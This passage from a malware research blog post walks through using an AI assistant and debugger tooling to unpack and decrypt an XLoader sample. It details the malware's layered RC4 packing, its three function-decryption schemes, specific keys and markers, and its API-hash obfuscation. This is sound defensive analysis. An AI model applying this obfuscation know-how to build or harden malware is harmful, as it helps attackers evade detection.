&lt;pre class="EnlighterJSRAW"&gt;Perform an initial analysis of the sample starting from the entry point and provide a short report.&lt;/pre&gt;



&lt;p&gt;Processing this simple prompt took 8 minutes and 46 seconds. As a result, our assistant correctly identified the RC4 implementation and concluded that the sample was packed. It is worth noting that, based only on the data available to the model, it suggested that the sample looked similar to XLoader. At the same time, there was nothing in the archive or in the initial prompt that explicitly pointed to this.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32100" height="110" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image3-Copy-2.png" width="690" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt;&amp;nbsp;&amp;#8211; Initial analysis report: Entry point analysis.&lt;/p&gt;



&lt;p&gt;In addition, it detected API call obfuscation. While the assistant was not fully able to deobfuscate all API calls during the quick triage, in some cases it inferred the function being called from the context and its signature.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32101" height="407" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image4-Copy-2.png" width="693" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 4&lt;/strong&gt;&amp;nbsp;&amp;#8211; Initial analysis report: Presumed call to the VirtualProtectEx function.&lt;/p&gt;



&lt;p&gt;It also successfully identified the point where execution is handed over to the decrypted code.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32102" height="94" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image5-Copy.png" width="693" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 5&lt;/strong&gt;&amp;nbsp;&amp;#8211; Initial analysis report: Call to the original entry point in the decrypted code.&lt;/p&gt;



&lt;p&gt;At this stage, our priority was to reach the payload as quickly as possible. We therefore focused on this goal by first asking the assistant to find all cryptographic function calls, and then to analyze how exactly the payload was decrypted.&lt;/p&gt;



&lt;p&gt;We found out that the main payload block goes through two rounds of RC4: first, an RC4 decryption of the entire buffer, and then a second pass in 256-byte chunks using a different key.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32103" height="407" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image6-Copy-2.png" width="693" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 6&lt;/strong&gt;&amp;nbsp;&amp;#8211; Initial analysis report: Description of the two rounds of RC4 encryption.&lt;/p&gt;



&lt;p&gt;In addition, the assistant managed to collect:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The virtual address of the original entry point in the decrypted code (0x00430CB3).&lt;/li&gt;



&lt;li&gt;The offset of the encrypted block in the binary (0x3143).&lt;/li&gt;



&lt;li&gt;The encrypted blob size (0x44A00).&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The next step was to obtain the real-time keys and verify the result. At this point, we turned to MCP. In one of the steps, we also asked the assistant to read a section of decrypted data to validate the correctness of the static decryption.&lt;/p&gt;



&lt;p&gt;As a result, it obtained the following keys:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Stage-1 Key&lt;/td&gt;&lt;td&gt;20EBC3439E2A201E6FC943EE95DACC6250A8A647&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Stage-2 Key&lt;/td&gt;&lt;td&gt;86908CFE6813CB2E532949B6F4D7C6E6B00362EE&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;It also obtained a section of decrypted code:&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-32151" height="921" src="https://research.checkpoint.com/wp-content/uploads/2025/10/Figure-7-AI-controlled-debugging-in-x86dbg.png" width="1528" /&gt;&lt;/figure&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 7&lt;/strong&gt;&amp;nbsp;&amp;#8211; AI-controlled debugging in x86dbg.&lt;/p&gt;



&lt;p&gt;After the final keys were read from memory, we asked the assistant to identify where and by which algorithms the keys were generated, and to verify the analysis was correct using the real-time data obtained in the previous step.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Find how the Stage-1 and Stage-2 RC4 keys are calculated: source key material and algorithms. Please note that ALL the required data is available to you in IDA export. 
Check your assumptions using the captured realtime values. Start with the Stage-1 key.&lt;/pre&gt;



&lt;p&gt;In the end, AI produced a working script that unpacked the analyzed sample. Unfortunately, the script was not universally applicable, as the patterns it used to locate the keys were tightly bound to this particular sample. As a result, it failed when we tried to apply it to samples from other versions, requiring further manual fine-tuning.&lt;/p&gt;



&lt;p&gt;Excluding the final step of creating a generic unpacker, the entire analysis took about 40 minutes and required 39 MCP calls. The table below lists the prompts we used and the time spent on each analysis step.&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Prompt&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Time consumed&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Number of MCP calls&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Initial prompt (instructions).&lt;/td&gt;&lt;td&gt;37s&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Perform an initial analysis of the sample starting from the entry point and provide a short report.&lt;/td&gt;&lt;td&gt;8m 46s&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Find and carefully inspect all calls to the found cryptographic functions.&lt;/td&gt;&lt;td&gt;4m 13s&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Analyze main payload blob decryption. Make sure you inspected all touches of the encrypted blob across different functions.&lt;/td&gt;&lt;td&gt;4m 13s&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Set breakpoints on required addresses and capture the required data. Also, set a breakpoint before calling the OEP and capture a small decrypted block at OEP for using it later for the decryption verification. Before start, please provide a plan.&lt;/td&gt;&lt;td&gt;9m 7s&lt;/td&gt;&lt;td&gt;39&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Find how the Stage-1 and Stage-2 RC4 keys are calculated: source key material and algorithms. Please note that ALL the required data is available to you in IDA export. Check your assumptions using the captured realtime values. Start with the Stage-1 key.&lt;/td&gt;&lt;td&gt;6m 56s&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Move to Stage-2 key derivation.&lt;/td&gt;&lt;td&gt;4m 40s&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Implement an offline reproducer for Stage-1 and Stage-2 keys. Then implement a complete static decryptor that works directly with sample.bin: extracts the encrypted payload from the binary and decrypts it. Verify it works correctly using the captured data (OEP bytes).&lt;/td&gt;&lt;td&gt;1m 13s&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;Total&lt;/em&gt;&lt;/td&gt;&lt;td&gt;39m 8s&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="analysis-of-the-unpacked-sample"&gt;Analysis of the unpacked sample&lt;/h2&gt;



&lt;p&gt;After manually creating a function at address&amp;nbsp;&lt;em&gt;0x00430CB3&lt;/em&gt;&amp;nbsp;(original entry point: OEP) which we named&amp;nbsp;&lt;em&gt;oep_start&lt;/em&gt;, we opened the unpacked sample in IDA and applied the export script again. We also created a new project to analyze the unpacked sample.&lt;/p&gt;



&lt;p&gt;Even before starting a deep dive, it was clear that IDA failed to recognize a large portion of the code, and many of the identified functions did not look valid.&lt;/p&gt;



&lt;figure class="wp-block-image"&gt;&lt;img alt="" src="https://research.checkpoint.com/s2_pandoc-html/media/image8.png" /&gt;&lt;/figure&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32105" height="718" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image8-Copy-2.png" width="1130" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 8&lt;/strong&gt;&amp;nbsp;&amp;#8211; Unpacked XLoader sample in IDA.&lt;/p&gt;



&lt;p&gt;This may indicate that the code is obfuscated in some way, or that the functions are encrypted. In fact, we know that XLoader uses on-the-fly function decryption, as we mentioned in the introduction. For some functions, multi-layer encryption is applied.&lt;/p&gt;



&lt;p&gt;For the sake of the experiment, we wanted to see if the AI assistant could determine all this on its own, without our guidance. We started the analysis with the same type of prompt we used when analyzing the packed sample.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Perform an initial analysis of the sample starting from the `oep_start` (`0x00430CB3`) and provide a short report.&lt;/pre&gt;



&lt;p&gt;After initial analysis, we identified:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Use of obfuscated API calls.&lt;/li&gt;



&lt;li&gt;Use of RC4 encryption with additional modifications before and after using RC4.&lt;/li&gt;



&lt;li&gt;Some stage-1 builder (a decryptor of the encrypted function).&lt;/li&gt;
&lt;/ul&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32106" height="481" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image9-Copy-2.png" width="1342" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 9&lt;/strong&gt;&amp;nbsp;&amp;#8211; Triage report and the “Stage-1 builder” function (a function decryptor stub).&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="function-decryption-scheme-i"&gt;Function decryption scheme I&lt;/h3&gt;



&lt;p&gt;Next, we asked the assistant to focus on the logic around the so-called&amp;nbsp;&lt;strong&gt;stage-1 builder&lt;/strong&gt;&amp;nbsp;(&lt;em&gt;sub_429143&lt;/em&gt;) and to locate cross-references of the functions involved. The AI assistant identified 90 similar functions. These functions derive 6-byte head and tail markers, use those markers to locate a target region in memory, overwrite the markers with six &lt;code&gt;NOP&lt;/code&gt; instructions (&lt;em&gt;&lt;code&gt;90 90 90 90 90 90&lt;/code&gt;&lt;/em&gt;), transform the region, and then transfer execution to a hardcoded address unique to each wrapper.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32107" height="257" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image10.png" width="713" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 10&lt;/strong&gt;&amp;nbsp;&amp;#8211; Results of the function encryption scheme analysis, together with the renamed functions from the analysis.&lt;/p&gt;



&lt;p&gt;The assistant also implemented inline Python snippets and decrypted one of the encrypted functions, providing us with all the data and the keys, as well as the part of the decrypted code:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32108" height="526" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image11.png" width="690" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 11&lt;/strong&gt;&amp;nbsp;&amp;#8211; Report on the successful decryption of one of the functions (0x00418DB3).&lt;/p&gt;



&lt;p&gt;Interestingly, in this case, the use of MCP wasn’t even necessary, as the validity of the extracted keys can be easily verified by AI: if it’s possible to locate the start and end markers of the code after decryption, it means the keys and the algorithm were recovered correctly. Additionally, we can see that the decrypted data doesn’t appear to be random (it contains sequences like&amp;nbsp;&lt;em&gt;&lt;code&gt;00 00&lt;/code&gt;&lt;/em&gt;&amp;nbsp;and&amp;nbsp;&lt;em&gt;&lt;code&gt;ff ff&lt;/code&gt;&lt;/em&gt;), which suggests the function was indeed decrypted correctly.&lt;/p&gt;



&lt;p&gt;The AI performed very well in reimplementing the algorithms, including the modified RC4 with additional tweaks, as well as in locating the keys within the provided sample. It also successfully implemented functions for detecting 6-byte markers.&lt;/p&gt;



&lt;p&gt;However, it was unable to fully implement a universal script capable of decrypting all functions without human assistance. The issue arose in locating all the XOR modifiers required to construct the 20-byte effective RC4 key.&lt;/p&gt;



&lt;p&gt;The challenge lies in the fact that the effective RC4 key is derived by XOR-ing its 4-byte components with a 4-byte modifier, which is unique for each encrypted function and is calculated this way:&lt;/p&gt;



&lt;pre class="wp-block-code"&gt;&lt;code&gt;&lt;em&gt;seed_external ^ seed_internal ^ 0x6CFC3E60&lt;/em&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="&amp;lt;strong&amp;gt;Figure 12&amp;lt;/strong&amp;gt; - Calculation of the 4-byte XOR modifier
for the key required to decrypt the functions." src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image12.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 12&lt;/strong&gt;&amp;nbsp;&amp;#8211; Calculation of the 4-byte XOR modifier for the key required to decrypt the functions.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;While&amp;nbsp;&lt;em&gt;&lt;code&gt;seed_internal&lt;/code&gt;&lt;/em&gt;&amp;nbsp;is always located within the wrapper function near the markers, the assistant was unable to implement a universal method for finding&amp;nbsp;&lt;em&gt;&lt;code&gt;seed_external&lt;/code&gt;&lt;/em&gt;&amp;nbsp;(see Figure 13 below), as it could be placed in various locations within the calling function and might be deliberately mixed with other constants.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="&amp;lt;strong&amp;gt;Figure 13&amp;lt;/strong&amp;gt; - Report on the limitations encountered
while creating the function decryption script." src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image13.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 13&lt;/strong&gt;&amp;nbsp;&amp;#8211; Report on the limitations encountered while creating the function decryption script.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;We had to manually modify the script to ensure it could correctly locate all external seeds. Additionally, we modified the rules for locating the remaining constants to make the script truly robust and capable of working with other samples as well. Therefore, the AI significantly reduced the time required for analysis and script development, but at this stage, it could not fully replace a human.&lt;/p&gt;



&lt;p&gt;It is clear that the creators of XLoader deliberately complicated the key construction process by scattering crucial constants across multiple functions, to the extent that even AI was unable to develop an algorithm to locate it. We are not disclosing how we derive the keys, so as not to give the XLoader developers any advantage.&lt;/p&gt;



&lt;p&gt;Finally, after applying the script, we obtained 51 functions decrypted in the first pass. Many of the decrypted functions also contained similar calls to encrypted functions. Applying the script three times in a row, we got a total of 77 decrypted functions out of the 90 initially found.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32111" height="359" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image14.png" width="563" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 14&lt;/strong&gt;&amp;nbsp;&amp;#8211; Decrypted function example with a patched 6-byte head marker (six NOP instructions).&lt;/p&gt;



&lt;p&gt;After loading the resulting sample into IDA, we can see that a significant number of code blocks are still unrecognized:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32112" height="45" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image15.png" width="847" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 15&lt;/strong&gt;&amp;nbsp;&amp;#8211; Significant number of code blocks remain unrecognized by IDA.&lt;/p&gt;



&lt;p&gt;During a quick review, we also identified several functions that still remain encrypted:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32113" height="225" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image16.png" width="1345" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 16&lt;/strong&gt;&amp;nbsp;&amp;#8211; Functions that remained encrypted after applying the decryption script.&lt;/p&gt;



&lt;p&gt;It’s also worth noting that in the scheme described above, encrypted functions are located using 6-byte sequences, which are replaced with six NOP instructions after decryption. This implies that the function must have a valid, unencrypted prologue. At the same time, in Figure 16, on the right we can see an encrypted function that lacks a valid prologue. This likely indicates that a different decryption method was used.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="function-decryption-scheme-ii"&gt;Function decryption scheme II&lt;/h3&gt;



&lt;p&gt;We recreated exporting the database and loaded it into ChatGPT. We initiated the analysis with the following prompt and uploaded the decryption log of the 77 functions:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;In the analyzed scheme, encrypted functions are located using 6-byte sequences, which are replaced with six NOP instructions after decryption.
This implies that the function must have a valid, unencrypted prologue. Some of the encrypted functions do not have a valid prologue (e.g., `sub_407293`, `sub_411053`, `sub_415343`). 
This likely indicates that a different method is used for it. Try to find it.&lt;/pre&gt;



&lt;p&gt;It’s worth noting that we used a little trickery by pointing out the absence of a valid prologue in the prompt. Without this observation, the AI assistant was unable to identify the additional decryptors.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32137" height="163" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-2.png" width="975" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 17&lt;/strong&gt;&amp;nbsp;&amp;#8211; Second decryption/patching scheme discovered.&lt;/p&gt;



&lt;p&gt;Instead of 6-byte tags, the newly discovered scheme computes 4-byte&amp;nbsp;&lt;em&gt;head&lt;/em&gt;&amp;nbsp;and&amp;nbsp;&lt;em&gt;tail&lt;/em&gt;&amp;nbsp;markers using XOR. For example:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32138" height="114" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-3.png" width="880" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 18&lt;/strong&gt;&amp;nbsp;&amp;#8211; Calculation of the head marker using XOR.&lt;/p&gt;



&lt;p&gt;The head marker anchors one byte before the real entry. After decryption, the code writes a canonical prologue (&lt;em&gt;&lt;code&gt;55 8B EC&lt;/code&gt;&lt;/em&gt;) at the buffer pointer plus one byte and patches the tail with&amp;nbsp;&lt;em&gt;&lt;code&gt;90 90 90 90&lt;/code&gt;&lt;/em&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32139" height="47" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-4.png" width="934" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 19&lt;/strong&gt;&amp;nbsp;&amp;#8211; Patching the head and tail markers with valid instructions.&lt;/p&gt;



&lt;p&gt;The function body is decrypted in two layers using&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_xform_sub_rc4_sub&lt;/code&gt;&lt;/em&gt;.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;

&lt;/ul&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;&lt;div class="wp-block-image"&gt;

&lt;/div&gt;&lt;/blockquote&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Layer 2 key: Constructed by concatenating the head marker with 16 zero bytes.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Wrapper &lt;em&gt;&lt;code&gt;0x00415943&lt;/code&gt;&lt;/em&gt; decrypts function &lt;em&gt;&lt;code&gt;0x00415343&lt;/code&gt;&lt;/em&gt; using:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Markers&lt;/strong&gt;: &lt;code&gt;4c ed 39 65&lt;/code&gt;, &lt;code&gt;a7 32 ca 6a&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Key-1&lt;/strong&gt;: 3f548513b8c7d376ec59d1a03e3313aaf6cd4262 (20B from &lt;code&gt;sub_404543&lt;/code&gt;, then XOR 0x36)&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Key-2&lt;/strong&gt;: 4ced396500000000000000000000000000000000&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Function decryption scheme III&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;In the latest scheme, 4-byte markers are also used to find the start and end of a function. As in the previous method, two layers of encryption are applied, and the same key is used to decrypt the first layer. However, the 20-byte key for the second layer is embedded within the wrappers (unique for each encrypted function) and is modified using a 4-byte value.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Wrapper &lt;em&gt;&lt;code&gt;0x00418dc3&lt;/code&gt;&lt;/em&gt; decrypts function &lt;em&gt;&lt;code&gt;0x0040d543&lt;/code&gt;&lt;/em&gt; using:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Markers&lt;/strong&gt;: &lt;code&gt;9c da 5e e8&lt;/code&gt;, &lt;code&gt;0e e7 b2 36&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Key-1&lt;/strong&gt;: 3f548513b8c7d376ec59d1a03e3313aaf6cd4262 (20B from &lt;code&gt;sub_404543&lt;/code&gt;, then XOR 0x36)&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Key-2&lt;/strong&gt;: c2b2622cf0608327d4e542bc4ac3d2f709e092dc (calculated in the wrapper)&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Additionally, a separate function may be used to handle the decryption of the second layer and the patching process.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32117" height="436" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image20.png" width="659" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 21&lt;/strong&gt;&amp;nbsp;&amp;#8211; Function used to handle the decryption of the second layer and the patching process.&lt;/p&gt;



&lt;p&gt;We identified three distinct function decryption schemes in XLoader:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Scheme 1 –&lt;/strong&gt;&amp;nbsp;Most common. In this scheme, encrypted functions already begin with a valid prologue. A global 20-byte base key is reused across all functions, but each function also has a unique 4-byte XOR modifier. The base key and modifier are combined to derive a per-function RC4 key. A modified RC4 routine is then used with this key to decrypt two 6-byte markers that define the boundaries of the encrypted block, and the same key is subsequently applied to the function body itself. Once decrypted, the two markers are overwritten with NOPs.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Scheme 2.&lt;/strong&gt;&amp;nbsp;Uses 4-byte markers and two encryption layers. The first layer uses a 20-byte key produced by a dedicated key-builder function, then XOR-tweaked with a single byte. The second layer key is constructed from the 4-byte head marker concatenated with sixteen zero bytes. After decryption, the wrapper repairs the function by patching&amp;nbsp;&lt;em&gt;&lt;code&gt;55 8B EC&lt;/code&gt;&lt;/em&gt;&amp;nbsp;at the prologue and filling the tail with NOPs.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Scheme 3.&lt;/strong&gt;&amp;nbsp;Similar to Scheme 2, but the second-layer key is not derived from the head marker. Instead, each wrapper embeds its own 20-byte constant (five DWORDs XORed with salt), which is used to decrypt the prefix up to a sentinel value before the same prologue/tail patching is applied.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;It is worth noting that to implement universal static decryptors, we still had to break the task down into smaller steps ourselves: locating wrapper functions, extracting 20-byte keys, recovering 4-byte modifiers, and identifying and calculating marker positions. We combined them into a single decryptor only after confirming that each step worked reliably and produced the correct data for every function. At the same time, AI significantly reduced the time required to implement regular expressions (even though they had to be adjusted manually) as well as during the analysis and implementation of cryptographic algorithms.&lt;/p&gt;



&lt;p&gt;With each decryption iteration we obtained a new batch of decrypted functions, some of which contained the keys required for decrypting additional functions. By applying all three decryptors sequentially over four iterations, we ultimately succeeded in decrypting&amp;nbsp;101 functions.&lt;/p&gt;



&lt;p&gt;Unfortunately, it was not possible to accurately measure the time spent on this task, as it required a considerable amount of additional work and manual corrections. However, this stage turned out to be the most complex and time-consuming for both us and the LLM.&lt;/p&gt;



&lt;p&gt;We also got&amp;nbsp;&lt;em&gt;suggestions.json&lt;/em&gt;&amp;nbsp;with the suggested names for the analyzed functions. This is very useful, because we can keep this file for other analysis sessions and easily import it in the current IDB, or even in a new IDB (after decrypting the functions) without the need to diff it with the old database.&lt;/p&gt;



&lt;p&gt;We now have a fully decrypted sample, which allows us to continue the analysis using the same methodology.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="api-calls-deobfuscation"&gt;API Calls deobfuscation&lt;/h2&gt;



&lt;p&gt;Now that we have a fully decrypted sample, we can apply the same approach to it. We first load&amp;nbsp;&lt;em&gt;suggestions.json&lt;/em&gt;&amp;nbsp;and then perform an export. As stated earlier, even during the very first analysis of the sample (before we had obtained the decrypted functions) the assistant pointed out the presence of obfuscated API calls. The import table in this sample is empty and there are no plaintext strings that might contain library or function names.&lt;/p&gt;



&lt;p&gt;As we created a new clean session by uploading the decrypted sample, we decided to test how reproducible the analysis results were.&lt;/p&gt;



&lt;p&gt;Therefore, in the very first prompt, without providing any hints, we asked the assistant to identify the API call obfuscation mechanisms. As in the previous case, we specified that the analysis should begin at the OEP rather than at the&amp;nbsp;&lt;em&gt;start&lt;/em&gt;&amp;nbsp;function, so that the AI assistant would not get bogged down analyzing the packer.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;The IAT is empty, no plaintext strings in the sample.
Determine how the sample resolves and invokes Windows APIs. Start the analysis from `oep_start` (`0x00430CB3`).&lt;/pre&gt;



&lt;p&gt;Four minutes later, we received a description of the algorithm:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32118" height="601" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image21.png" width="776" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 22&lt;/strong&gt;&amp;nbsp;&amp;#8211; Description of one of the API resolution algorithms.&lt;/p&gt;



&lt;p&gt;Interestingly, during the first analysis (when part of the functions was still encrypted) and the second analysis, our AI assistant identified different functions responsible for API hash decryption. In the first case, it pointed to&amp;nbsp;&lt;em&gt;&lt;code&gt;sub_404603&lt;/code&gt;&lt;/em&gt;&amp;nbsp;(later renamed to&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_apiid_decrypt_salt&lt;/code&gt;&lt;/em&gt;), while in the second case it identified only&amp;nbsp;&lt;em&gt;&lt;code&gt;sub_4045B3&lt;/code&gt;&lt;/em&gt;&amp;nbsp;(&lt;em&gt;&lt;code&gt;ai_apiid_decrypt&lt;/code&gt;&lt;/em&gt;).&lt;/p&gt;



&lt;p&gt;Next, we used the following simple prompt to generate a script for API call deobfuscation:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Implement an IDAPython script for deobfuscating API calls. Annotate the resolver and every call site with Module!Function, original ID, and EA; IDA 9+. Log all deobfuscation attempts.&lt;/pre&gt;



&lt;p&gt;We got a script with the following functionality:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="&amp;lt;strong&amp;gt;Figure 23&amp;lt;/strong&amp;gt; - Description of the IDA Python script for
API call deobfuscation." src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image22.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 23&lt;/strong&gt;&amp;nbsp;&amp;#8211; Description of the IDA Python script for API call deobfuscation.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


